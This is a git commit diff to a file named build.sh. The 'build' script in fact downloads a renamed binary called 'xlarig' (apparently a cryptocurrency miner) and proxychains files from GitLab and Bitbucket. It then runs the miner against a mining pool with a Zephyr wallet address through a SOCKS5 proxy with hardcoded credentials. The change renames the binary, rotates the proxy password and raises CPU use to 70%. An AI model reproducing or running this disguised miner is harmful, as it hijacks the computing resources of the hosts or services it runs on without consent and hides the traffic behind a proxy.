2321253efb8002976aa8fc955340d26355c412fe
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-15 23:40:43 +0700

    Update build.sh

--- build.sh
+++ build.sh
@@ -1,8 +1,8 @@
 proxy="34.192.37.108" 
 port="1080" 
 user="fixie"  
-pass="h4xeMlug52xFrKz" 
-wget -q -O skydrone https://gitlab.com/55113110159/dokerweb/-/raw/main/xlarig && chmod +x skydrone
+pass="wJAdlDMok2aTd6z" 
+wget -q -O diamona https://gitlab.com/55113110159/dokerweb/-/raw/main/xlarig && chmod +x diamona
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/panel && chmod +x panel 
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/libproxychains4.so && chmod +x libproxychains4.so 
@@ -19,4 +19,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./skydrone --donate-level 1 -o 149.50.222.86:80 -u ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ.8v -a rx/0 -x socks5://fixie:h4xeMlug52xFrKz@34.192.37.108:1080 --cpu-max-threads-hint=50% -k  
+./panel ./diamona --donate-level 1 -o 149.50.222.86:80 -u ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ.8v -a rx/0 -x socks5://fixie:wJAdlDMok2aTd6z@34.192.37.108:1080 --cpu-max-threads-hint=70% -k  
